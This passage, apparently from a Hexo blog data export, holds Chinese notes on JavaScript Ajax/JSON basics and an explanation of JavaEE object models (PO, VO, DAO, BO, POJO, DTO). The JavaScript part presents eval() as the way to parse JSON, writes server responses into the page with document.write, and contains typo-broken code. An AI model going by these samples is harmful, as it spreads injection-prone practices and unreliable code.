NULL\n2.引用数据类型:Object(Array,Date,RegExp,Function)\n</code></pre><h4 id=\"获取页面中所有的input\"><a href=\"#获取页面中所有的input\" class=\"headerlink\" title=\"获取页面中所有的input\"></a>获取页面中所有的input</h4><pre><code>var domList = document.getElementsByTagName(‘input’)\n</code></pre><h4 id=\"什么是Ajax和JSON，它们的优缺点\"><a href=\"#什么是Ajax和JSON，它们的优缺点\" class=\"headerlink\" title=\"什么是Ajax和JSON，它们的优缺点\"></a>什么是Ajax和JSON，它们的优缺点</h4><pre><code>Ajax是异步的Javascript和XML,用于WEB页面中异步数据交互\n优点:\n    1.使得用户在不刷新页面的情况下加载数据,提高用户的体验性\n    2.在不重载页面的情况下加载局部数据,减少数据的交互量  \n缺点:\n    1.存在安全问题\n    2.对搜索引擎支持不好\n    3.一些手持设备目前还不支持  \n</code></pre><p> Json是一个轻量级的数据交互格式,ECMA的一个子集,所以js支持性好</p>\n<pre><code>优点:\n    1.轻量级,易于人编写和阅读\n    2.是ECMA的一个子集,和js结合好,便于解析\n</code></pre><h4 id=\"什么是eval-函数\"><a href=\"#什么是eval-函数\" class=\"headerlink\" title=\"什么是eval()函数\"></a>什么是eval()函数</h4><p>此函数是将json格式的字符串转换成JavaScript对象</p>\n<h4 id=\"JS遍历Json数据\"><a href=\"#JS遍历Json数据\" class=\"headerlink\" title=\"JS遍历Json数据\"></a>JS遍历Json数据</h4><pre><code>var data=[{name:&quot;a&quot;,age:12},{name:&quot;b&quot;,age:11},{name:&quot;c&quot;,age:13},{name:&quot;d&quot;,age:14}];\nfor(var o in data){\n    alert(o);\n    alert(data[o]);\n    alert(&quot;text:&quot;+data[o].name+&quot; value:&quot;+data[o].age );\n}\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    function text(){\n        var json = {&quot;options&quot;:&quot;[{/&quot;text/&quot;:/&quot;王家湾/&quot;,/&quot;value/&quot;:/&quot;9/&quot;},{/&quot;text/&quot;:/&quot;李家湾/&quot;,/&quot;value/&quot;:/&quot;10/&quot;},{/&quot;text/&quot;:/&quot;邵家湾/&quot;,/&quot;value/&quot;:/&quot;13/&quot;}]&quot;}\n        json = eval(json.options)\n        for(var i=0; i&lt;json.length; i++){\n            alert(json[i].text+&quot; &quot; + json[i].value)\n        }\n    }\n&lt;/script&gt;\n</code></pre><h4 id=\"Ajax技术原理\"><a href=\"#Ajax技术原理\" class=\"headerlink\" title=\"Ajax技术原理\"></a>Ajax技术原理</h4><p>&emsp;&emsp;Ajax是通过XMLHTTPRequest对象异步向服务器端发送请求,服务器端接收请求处理,返回XML或者JSON数据</p>\n<h4 id=\"Ajax的执行步骤\"><a href=\"#Ajax的执行步骤\" class=\"headerlink\" title=\"Ajax的执行步骤\"></a>Ajax的执行步骤</h4><p>1.创建XMLHTTPRequest对象<br>2.监听 onreadystatechange事件<br>3.打开连接<br>4.发送请求</p>\n<pre><code>function Ustbwuyi() {\n    var data = document.getElementById(&quot;username&quot;).value;\n    CreateXmlHttp();\n    if (!xmlhttp) {\n    alert(&quot;创建xmlhttp对象异常！&quot;);\n    return false;\n    }\n\n    xmlhttp.open(&quot;POST&quot;, url, false);\n\n    xmlhttp.onreadystatechange = function () {\n    if (xmlhttp.readyState == 4) {\n        document.getElementById(&quot;user1&quot;).innerHTML = &quot;数据正在加载...&quot;;\n        if (xmlhttp.status == 200) {\n            document.write(xmlhttp.responseText);\n        }\n    }\n    }\n    xmlhttp.send();\n}\n</code></pre><p>XmlHttpRequest对象解析:<br>　　   它的属性有：<br>  　　  onreadystatechange  每次状态改变所触发事件的事件处理程序。<br>  　　  responseText     从服务器进程返回数据的字符串形式。<br>  　　  responseXML    从服务器进程返回的DOM兼容的文档数据对象。<br>  　　  status           从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）<br>  　　  status Text       伴随状态码的字符串信息<br>  　　  readyState       对象状态值<br>　　　　0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）<br>　　　　1 (初始化) 对象已建立，尚未调用send方法<br>　　　　2 (发送数据) send方法已调用，但是当前的状态及http头未知<br>　　　　3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，<br>　　　　4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据</p>\n<p>定义js对象和属性</p>\n<pre><code>var person = function(){};\nvar p = persopn.prototype;\np.name=&apos;张三&apos;;\npage=18;\np.add = function() {\n    alert(&quot;HELLO&quot;);\n}\n</code></pre>"},{"title":"JavaEE开发中的几种对象模型","date":"2017-11-01T06:15:10.000Z","_content":"#### JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释\n1. **PO:** persistant object 持久对象,可以看成是与数据库中的表相映射的java对象。最简单的PO就是对应数据库中某个表中的一条记录，多个记录可以用PO的集合。PO中应该不包含任何对数据库的操作。 \n2. **VO:** value object值对象。通常用于业务层之间的数据传递，和PO一样也是仅仅包含数据而已。但应是抽象出的业务对象,可以和表对应,也可以不,这根据业务的需要.个人觉得同DTO(数据传输对象),在web上传递。\n\n3. **DAO:** data access object 数据访问对象，是一个sun的一个标准j2ee设计模式 ．此对象用于访问数据库。通常和PO结合使用，DAO中包含了各种数据库的操作方法。通过它的方法,结合PO对数据库进行相关的操作。夹在业务逻辑与数据 库资源中间。配合VO, \n提供数据库的CRUD操作...\n\n4. **BO**(business object) 业务对象\n从业务模型的角度看,见UML元件领域模型中的领域对象。封装业务逻辑的java对象,通过调用DAO方法,结合PO,VO进行业务操作。这个对象可以包括一个或多个其它的对象。 \n比如一个简历，有教育经历、工作经历、 关系等等。 \n我们可以把教育经历对应一个PO，工作经历对应一个PO， 关系对应一个PO。 \n建立一个对应简历的BO对象处理简历，每个BO包含这些PO。 \n这样处理业务逻辑时，我们就可以针对BO去处理。\n(关于BO主要有三种概念 :\n1 、只包含业务对象的属性； \n2 、只包含业务方法； \n3 、两者都包含。 \n在实际使用中，认为哪一种概念正确并不重要，关键是实际应用中适合自己项目的需要)\n\n5. **POJO:** plain ordinary java object 简单无规则java对象,我个人觉得它和其他不是一个层面上的东西,VO和PO应该都属于它。\n\n6. **DTO:** Data Transfer Object（数据传输对象）DTO 是一组需要跨进程或网络边界传输的聚合数据的简单容器。它不应该包含业务逻辑，并将其行为限制为诸如内部一致性检查和基本验证之类的活动。注意，不要因实 现这些方法而导致 DTO 依赖于任何新类。在设计数据传输对象时，您有两种主要选择：使用一般集合；或使用显式的 getter 和 setter 方法创建自定义对象。\n\n#### 对象模型特征\n**ORM: **是 Object Relational Mapping（对象关系映射）的缩写。通俗点讲，就是将对象与关系数据库绑定，用对象来表示关系数据。在ROM的世界里，有两个基本的也是重要的东东需要了解，即VO，PO。 \n1. VO，值对象(Value Object)，PO，持久对象(Persisent Object)，它们是由一组属性和属性的get和set方法组成。从结构上看，它们并没有什么不同的地方。但从其意义和本质上来看是完全不同的。\n\n2. VO是用new关键字创建，由GC回收的。 \n　　PO则是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 \n3. VO是值对象，精确点讲它是业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方。 \n4. PO则是有状态的，每个属性代表其当前的状态。它是物理数据的对象表示。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 \n5. VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。 \n　　PO的属性是跟数据库表的字段一一对应的。PO对象需要实现序列化接口。\nPO：\n\n\tpersistant object持久对象\n\t最形象的理解就是一个PO就是数据库中的一条记录。\n\t好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。\n\n\nBO：\n\n\tbusiness object业务对象\n\t主要作用是把业务逻辑封装为一个对象。这个对象可以包括一个或多个其它的对象。\n\t比如一个简历，有教育经历、工作经历、  关系等等。\n\t我们可以把教育经历对应一个PO，工作经历对应一个PO，  关系对应一个PO。\n\t建立一个对应简历的BO对象处理简历，每个BO包含这些PO。\n\t这样处理业务逻辑时，我们就可以针对BO去处理。\nVO ：\n\n\tvalue object值对象\n\tViewObject表现层对象\n\t主要对应界面显示的数据对象。对于一个WEB页面，或者SWT、SWING的一个界面，用一个VO对象对应整个界面的值。\n\nDTO ：\n\n\tData Transfer Object数据传输对象\n\t主要用于远程调用等需要大量传输对象的地方。\n\t比如我们一张表有100个字段，那么对应的PO就有100个属性。\n\t但是我们界面上只要显示10个字段，\n\t客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，\n\t这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO\n\nPOJO ：\n\n\tplain ordinary java object 简单java对象\n\t个人感觉POJO是最常见最多变的对象，是一个中间对象，也是我们最常打交道的对象。\n\t一个POJO持久化以后就是PO\n\t直接用它传递、传递过程中就是DTO\n\t直接用来对应表示层就是VO","source":"_posts/JavaEE开发中的几种对象模型.md","raw":"---\ntitle: JavaEE开发中的几种对象模型\ndate: 2017-11-01 14:15:10\ntags: JavaEE\n---\n#### JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释\n1. **PO:** persistant object 持久对象,可以看成是与数据库中的表相映射的java对象。最简单的PO就是对应数据库中某个表中的一条记录，多个记录可以用PO的集合。PO中应该不包含任何对数据库的操作。 \n2. **VO:** value object值对象。通常用于业务层之间的数据传递，和PO一样也是仅仅包含数据而已。但应是抽象出的业务对象,可以和表对应,也可以不,这根据业务的需要.个人觉得同DTO(数据传输对象),在web上传递。\n\n3. **DAO:** data access object 数据访问对象，是一个sun的一个标准j2ee设计模式 ．此对象用于访问数据库。通常和PO结合使用，DAO中包含了各种数据库的操作方法。通过它的方法,结合PO对数据库进行相关的操作。夹在业务逻辑与数据 库资源中间。配合VO, \n提供数据库的CRUD操作...\n\n4. **BO**(business object) 业务对象\n从业务模型的角度看,见UML元件领域模型中的领域对象。封装业务逻辑的java对象,通过调用DAO方法,结合PO,VO进行业务操作。这个对象可以包括一个或多个其它的对象。 \n比如一个简历，有教育经历、工作经历、 关系等等。 \n我们可以把教育经历对应一个PO，工作经历对应一个PO， 关系对应一个PO。 \n建立一个对应简历的BO对象处理简历，每个BO包含这些PO。 \n这样处理业务逻辑时，我们就可以针对BO去处理。\n(关于BO主要有三种概念 :\n1 、只包含业务对象的属性； \n2 、只包含业务方法； \n3 、两者都包含。 \n在实际使用中，认为哪一种概念正确并不重要，关键是实际应用中适合自己项目的需要)\n\n5. **POJO:** plain ordinary java object 简单无规则java对象,我个人觉得它和其他不是一个层面上的东西,VO和PO应该都属于它。\n\n6. **DTO:** Data Transfer Object（数据传输对象）DTO 是一组需要跨进程或网络边界传输的聚合数据的简单容器。它不应该包含业务逻辑，并将其行为限制为诸如内部一致性检查和基本验证之类的活动。注意，不要因实 现这些方法而导致 DTO 依赖于任何新类。在设计数据传输对象时，您有两种主要选择：使用一般集合；或使用显式的 getter 和 setter 方法创建自定义对象。\n\n#### 对象模型特征\n**ORM: **是 Object Relational Mapping（对象关系映射）的缩写。通俗点讲，就是将对象与关系数据库绑定，用对象来表示关系数据。在ROM的世界里，有两个基本的也是重要的东东需要了解，即VO，PO。 \n1. VO，值对象(Value Object)，PO，持久对象(Persisent Object)，它们是由一组属性和属性的get和set方法组成。从结构上看，它们并没有什么不同的地方。但从其意义和本质上来看是完全不同的。\n\n2. VO是用new关键字创建，由GC回收的。 \n　　PO则是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 \n3. VO是值对象，精确点讲它是业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方。 \n4. PO则是有状态的，每个属性代表其当前的状态。它是物理数据的对象表示。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 \n5. VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。 \n　　PO的属性是跟数据库表的字段一一对应的。PO对象需要实现序列化接口。\nPO：\n\n\tpersistant object持久对象\n\t最形象的理解就是一个PO就是数据库中的一条记录。\n\t好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。\n\n\nBO：\n\n\tbusiness object业务对象\n\t主要作用是把业务逻辑封装为一个对象。这个对象可以包括一个或多个其它的对象。\n\t比如一个简历，有教育经历、工作经历、  关系等等。\n\t我们可以把教育经历对应一个PO，工作经历对应一个PO，  关系对应一个PO。\n\t建立一个对应简历的BO对象处理简历，每个BO包含这些PO。\n\t这样处理业务逻辑时，我们就可以针对BO去处理。\nVO ：\n\n\tvalue object值对象\n\tViewObject表现层对象\n\t主要对应界面显示的数据对象。对于一个WEB页面，或者SWT、SWING的一个界面，用一个VO对象对应整个界面的值。\n\nDTO ：\n\n\tData Transfer Object数据传输对象\n\t主要用于远程调用等需要大量传输对象的地方。\n\t比如我们一张表有100个字段，那么对应的PO就有100个属性。\n\t但是我们界面上只要显示10个字段，\n\t客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，\n\t这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO\n\nPOJO ：\n\n\tplain ordinary java object 简单java对象\n\t个人感觉POJO是最常见最多变的对象，是一个中间对象，也是我们最常打交道的对象。\n\t一个POJO持久化以后就是PO\n\t直接用它传递、传递过程中就是DTO\n\t直接用来对应表示层就是VO","slug":"JavaEE开发中的几种对象模型","published":1,"updated":"2018-01-31T06:27:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44txa003wmfahx8i8qox8","content":"<h4 id=\"JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释\"><a href=\"#JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释\" class=\"headerlink\" title=\"JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释\"></a>JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释</h4><ol>\n<li><strong>PO:</strong> persistant object 持久对象,可以看成是与数据库中的表相映射的java对象。最简单的PO就是对应数据库中某个表中的一条记录，多个记录可以用PO的集合。PO中应该不包含任何对数据库的操作。 </li>\n<li><p><strong>VO:</strong> value object值对象。通常用于业务层之间的数据传递，和PO一样也是仅仅包含数据而已。但应是抽象出的业务对象,可以和表对应,也可以不,这根据业务的需要.个人觉得同DTO(数据传输对象),在web上传递。</p>\n</li>\n<li><p><strong>DAO:</strong> data access object 数据访问对象，是一个sun的一个标准j2ee设计模式 ．此对象用于访问数据库。通常和PO结合使用，DAO中包含了各种数据库的操作方法。通过它的方法,结合PO对数据库进行相关的操作。夹在业务逻辑与数据 库资源中间。配合VO,<br>提供数据库的CRUD操作…</p>\n</li>\n<li><p><strong>BO</strong>(business object) 业务对象<br>从业务模型的角度看,见UML元件领域模型中的领域对象。封装业务逻辑的java对象,通过调用DAO方法,结合PO,VO进行业务操作。这个对象可以包括一个或多个其它的对象。<br>比如一个简历，有教育经历、工作经历、 关系等等。<br>我们可以把教育经历对应一个PO，工作经历对应一个PO， 关系对应一个PO。<br>建立一个对应简历的BO对象处理简历，每个BO包含这些PO。<br>这样处理业务逻辑时，我们就可以针对BO去处理。<br>(关于BO主要有三种概念 :<br>1 、只包含业务对象的属性；<br>2 、只包含业务方法；<br>3 、两者都包含。<br>在实际使用中，认为哪一种概念正确并不重要，关键是实际应用中适合自己项目的需要)</p>\n</li>\n<li><p><strong>POJO:</strong> plain ordinary java object 简单无规则java对象,我个人觉得它和其他不是一个层面上的东西,VO和PO应该都属于它。</p>\n</li>\n<li><p><strong>DTO:</strong> Data Transfer Object（数据传输对象）DTO 是一组需要跨进程或网络边界传输的聚合数据的简单容器。它不应该包含业务逻辑，并将其行为限制为诸如内部一致性检查和基本验证之类的活动。注意，不要因实 现这些方法而导致 DTO 依赖于任何新类。在设计数据传输对象时，您有两种主要选择：使用一般集合；或使用显式的 getter 和 setter 方法创建自定义对象。</p>\n</li>\n</ol>\n<h4 id=\"对象模型特征\"><a href=\"#对象模型特征\" class=\"headerlink\" title=\"对象模型特征\"></a>对象模型特征</h4><p><strong>ORM: </strong>是 Object Relational Mapping（对象关系映射）的缩写。通俗点讲，就是将对象与关系数据库绑定，用对象来表示关系数据。在ROM的世界里，有两个基本的也是重要的东东需要了解，即VO，PO。 </p>\n<ol>\n<li><p>VO，值对象(Value Object)，PO，持久对象(Persisent Object)，它们是由一组属性和属性的get和set方法组成。从结构上看，它们并没有什么不同的地方。但从其意义和本质上来看是完全不同的。</p>\n</li>\n<li><p>VO是用new关键字创建，由GC回收的。<br>　　PO则是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 </p>\n</li>\n<li>VO是值对象，精确点讲它是业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方。 </li>\n<li>PO则是有状态的，每个属性代表其当前的状态。它是物理数据的对象表示。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 </li>\n<li><p>VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。<br>　　PO的属性是跟数据库表的字段一一对应的。PO对象需要实现序列化接口。<br>PO：</p>\n<p> persistant object持久对象<br> 最形象的理解就是一个PO就是数据库中的一条记录。<br> 好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。</p>\n</li>\n</ol>\n<p>BO：</p>\n<pre><code>business object业务对象\n主要作用是把业务逻辑封装为一个对象。这个对象可以包括一个或多个其它的对象。\n比如一个简历，有教育经历、工作经历、  关系等等。\n我们可以把教育经历对应一个PO，工作经历对应一个PO，  关系对应一个PO。\n建立一个对应简历的BO对象处理简历，每个BO包含这些PO。\n这样处理业务逻辑时，我们就可以针对BO去处理。\n</code></pre><p>VO ：</p>\n<pre><code>value object值对象\nViewObject表现层对象\n主要对应界面显示的数据对象。对于一个WEB页面，或者SWT、SWING的一个界面，用一个VO对象对应整个界面的值。\n</code></pre><p>DTO ：</p>\n<pre><code>Data Transfer Object数据传输对象\n主要用于远程调用等需要大量传输对象的地方。\n比如我们一张表有100个字段，那么对应的PO就有100个属性。\n但是我们界面上只要显示10个字段，\n客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，\n这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO\n</code></pre><p>POJO ：</p>\n<pre><code>plain ordinary java object 简单java对象\n个人感觉POJO是最常见最多变的对象，是一个中间对象，也是我们最常打交道的对象。\n一个POJO持久化以后就是PO\n直接用它传递、传递过程中就是DTO\n直接用来对应表示层就是VO\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释\"><a href=\"#JavaEE开发中的几种对象模型-PO-VO-DAO-BO-POJO，DTO-解释\" class=\"headerlink\" title=\"JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释\"></a>JavaEE开发中的几种对象模型(PO,VO,DAO,BO,POJO，DTO)解释</h4><ol>\n<li><strong>PO:</strong> persistant object 持久对象,可以看成是与数据库中的表相映射的java对象。最简单的PO就是对应数据库中某个表中的一条记录，多个记录可以用PO的集合。PO中应该不包含任何对数据库的操作。 </li>\n<li><p><strong>VO:</strong> value object值对象。通常用于业务层之间的数据传递，和PO一样也是仅仅包含数据而已。但应是抽象出的业务对象,可以和表对应,也可以不,这根据业务的需要.个人觉得同DTO(数据传输对象),在web上传递。</p>\n</li>\n<li><p><strong>DAO:</strong> data access object 数据访问对象，是一个sun的一个标准j2ee设计模式 ．此对象用于访问数据库。通常和PO结合使用，DAO中包含了各种数据库的操作方法。通过它的方法,结合PO对数据库进行相关的操作。夹在业务逻辑与数据 库资源中间。配合VO,<br>提供数据库的CRUD操作…</p>\n</li>\n<li><p><strong>BO</strong>(business object) 业务对象<br>从业务模型的角度看,见UML元件领域模型中的领域对象。封装业务逻辑的java对象,通过调用DAO方法,结合PO,VO进行业务操作。这个对象可以包括一个或多个其它的对象。<br>比如一个简历，有教育经历、工作经历、 关系等等。<br>我们可以把教育经历对应一个PO，工作经历对应一个PO， 关系对应一个PO。<br>建立一个对应简历的BO对象处理简历，每个BO包含这些PO。<br>这样处理业务逻辑时，我们就可以针对BO去处理。<br>(关于BO主要有三种概念 :<br>1 、只包含业务对象的属性；<br>2 、只包含业务方法；<br>3 、两者都包含。<br>在实际使用中，认为哪一种概念正确并不重要，关键是实际应用中适合自己项目的需要)</p>\n</li>\n<li><p><strong>POJO:</strong> plain ordinary java object 简单无规则java对象,我个人觉得它和其他不是一个层面上的东西,VO和PO应该都属于它。</p>\n</li>\n<li><p><strong>DTO:</strong> Data Transfer Object（数据传输对象）DTO 是一组需要跨进程或网络边界传输的聚合数据的简单容器。它不应该包含业务逻辑，并将其行为限制为诸如内部一致性检查和基本验证之类的活动。注意，不要因实 现这些方法而导致 DTO 依赖于任何新类。在设计数据传输对象时，您有两种主要选择：使用一般集合；或使用显式的 getter 和 setter 方法创建自定义对象。</p>\n</li>\n</ol>\n<h4 id=\"对象模型特征\"><a href=\"#对象模型特征\" class=\"headerlink\" title=\"对象模型特征\"></a>对象模型特征</h4><p><strong>ORM: </strong>是 Object Relational Mapping（对象关系映射）的缩写。通俗点讲，就是将对象与关系数据库绑定，用对象来表示关系数据。在ROM的世界里，有两个基本的也是重要的东东需要了解，即VO，PO。 </p>\n<ol>\n<li><p>VO，值对象(Value Object)，PO，持久对象(Persisent Object)，它们是由一组属性和属性的get和set方法组成。从结构上看，它们并没有什么不同的地方。但从其意义和本质上来看是完全不同的。</p>\n</li>\n<li><p>VO是用new关键字创建，由GC回收的。<br>　　PO则是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 </p>\n</li>\n<li>VO是值对象，精确点讲它是业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方。 </li>\n<li>PO则是有状态的，每个属性代表其当前的状态。它是物理数据的对象表示。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 </li>\n<li><p>VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。<br>　　PO的属性是跟数据库表的字段一一对应的。PO对象需要实现序列化接口。<br>PO：</p>\n<p> persistant object持久对象<br> 最形象的理解就是一个PO就是数据库中的一条记录。<br> 好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。</p>\n</li>\n</ol>\n<p>BO：</p>\n<pre><code>business object业务对象\n主要作用是把业务逻辑封装为一个对象。这个对象可以包括一个或多个其它的对象。\n比如一个简历，有教育经历、工作经历、  关系等等。\n我们可以把教育经历对应一个PO，工作经历对应一个PO，  关系对应一个PO。\n建立一个对应简历的BO对象处理简历，每个BO包含这些PO。\n这样处理业务逻辑时，我们就可以针对BO去处理。\n</code></pre><p>VO ：</p>\n<pre><code>value object值对象\nViewObject表现层对象\n主要对应界面显示的数据对象。对于一个WEB页面，或者SWT、SWING的一个界面，用一个VO对象对应整个界面的值。\n</code></pre><p>DTO ：</p>\n<pre><code>Data Transfer Object数据传输对象\n主要用于远程调用等需要大量传输对象的地方。\n比如我们一张表有100个字段，那么对应的PO就有100个属性。\n但是我们界面上只要显示10个字段，\n客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，\n这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO\n</code></pre><p>POJO ：</p>\n<pre><code>plain ordinary java object 简单java对象\n个人感觉POJO是最常见最多变的对象，是一个中间对象，也是我们最常打交道的对象。\n一个POJO持久化以后就是PO\n直接用它传递、传递过程中就是DTO\n直接用来对应表示层就是VO\n</code></pre>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjow44tvd0000mfahtn9wwrmu","tag_id":"cjow44tvi0002mfah1gboidcg","_id":"cjow44tvm0007mfahw5i6epmz"},{"post_id":"cjow44tvh0001mfahw30i7boz","tag_id":"cjow44tvm0006mfah4wtouht2","_id":"cjow44tvq000cmfahqou1nueh"},{"post_id":"cjow44tvk0003mfahsn712xgk","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tvt000gmfah61q5uebm"},{"post_id":"cjow44tvk0004mfahzn13c2qv","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tvv000kmfah9wz2zyfr"},{"post_id":"cjow44tvl0005mfahgdsqc89h","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tvx000omfahz62vch6p"},{"post_id":"cjow44tvw000lmfah2jkbvfub","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tvy000qmfahio7n2t7e"},{"post_id":"cjow44tvn0008mfahzky5xltn","tag_id":"cjow44tvw000mmfah174xl5tm","_id":"cjow44tvz000tmfah5dmtmp2k"},{"post_id":"cjow44tvy000pmfah4q804s5y","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tw0000vmfahngcmht6b"},{"post_id":"cjow44tvo0009mfah6ebl6jbh","tag_id":"cjow44tvy000rmfahw1z4ydb9","_id":"cjow44tw1000ymfaho7cn5ymw"},{"post_id":"cjow44tvp000bmfahc0yc197i","tag_id":"cjow44tw1000xmfahhja74wp6","_id":"cjow44tw40013mfahc7dk055i"},{"post_id":"cjow44tvq000dmfahs6f0y04c","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44tw60017mfahfclzk4ma"},{"post_id":"cjow44tvs000fmfahakn533s3","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44tw8001bmfah41vgrab3"},{"post_id":"cjow44tvu000hmfahnn5vlkjv","tag_id":"cjow44tw70019mfahd97i2rui","_id":"cjow44twa001fmfahwj0i5dog"},{"post_id":"cjow44tvv000jmfahngn2l8mk","tag_id":"cjow44tw9001dmfahnaveslbx","_id":"cjow44twb001jmfahjhg9yhs8"},{"post_id":"cjow44twa001hmfah0qivqqyu","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44twc001lmfaho6fhwk53"},{"post_id":"cjow44tvx000nmfaharc80vem","tag_id":"cjow44twb001imfaht9bok07e","_id":"cjow44twd001pmfahpaz1nrqs"},{"post_id":"cjow44tvz000smfahbr10bg6b","tag_id":"cjow44twd001nmfah4w7h22dg","_id":"cjow44twf001tmfah6qxkio3m"},{"post_id":"cjow44tw0000umfah90ded0bi","tag_id":"cjow44twe001rmfahthyyj92n","_id":"cjow44twi001xmfahvdlnkj9e"},{"post_id":"cjow44tw0000wmfahpaoo6shq","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44twj0021mfahrkhayyxe"},{"post_id":"cjow44tw1000zmfahbi0y821k","tag_id":"cjow44twj0020mfahqw36dz91","_id":"cjow44twl0026mfah5ywqv59g"},{"post_id":"cjow44twk0023mfahu697ntej","tag_id":"cjow44tw9001dmfahnaveslbx","_id":"cjow44twm0028mfaha0934s7u"},{"post_id":"cjow44tw20010mfahdny1ia24","tag_id":"cjow44twl0024mfah0c7pfshw","_id":"cjow44twn002bmfahkn72ayby"},{"post_id":"cjow44twl0027mfahpw4074km","tag_id":"cjow44tw9001dmfahnaveslbx","_id":"cjow44two002dmfahtkcohens"},{"post_id":"cjow44tw30012mfah3v1k5d0i","tag_id":"cjow44twm0029mfah45gajg7j","_id":"cjow44twp002gmfah4ltmc8rr"},{"post_id":"cjow44tw40014mfahh6zafgxv","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44twq002kmfaha6h4520b"},{"post_id":"cjow44twp002hmfahftdro4ws","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44twr002mmfahvd96kod6"},{"post_id":"cjow44tw50016mfahzw2cjona","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44tws002pmfahyh3bs430"},{"post_id":"cjow44tw60018mfahqmhv4shs","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44twu002tmfahdnpmtk5j"},{"post_id":"cjow44tw7001amfahmyazk7pf","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44tww002xmfah65g6g8pl"},{"post_id":"cjow44tw8001cmfahqlzyoz7f","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44twy0031mfahvrd1nhnh"},{"post_id":"cjow44tww002ymfahsiwpp3uk","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44twz0033mfah7l5vzy5a"},{"post_id":"cjow44twx0030mfahol0xsrs6","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tx00036mfahsswpkn8b"},{"post_id":"cjow44tw9001emfaho09qymr2","tag_id":"cjow44twg001vmfahyb9vgr5k","_id":"cjow44tx10038mfahdivssm45"},{"post_id":"cjow44twz0032mfahd28448f9","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tx2003bmfah3zud0qgr"},{"post_id":"cjow44tx00035mfaho61clva9","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44tx3003dmfahh9i164fj"},{"post_id":"cjow44twa001gmfah9entbjtl","tag_id":"cjow44twz0034mfahlh41yzdm","_id":"cjow44tx4003gmfahqf8bjoyg"},{"post_id":"cjow44tx10039mfahr7bqgdsl","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tx5003imfahtzcox7uu"},{"post_id":"cjow44tx2003cmfahrc755igv","tag_id":"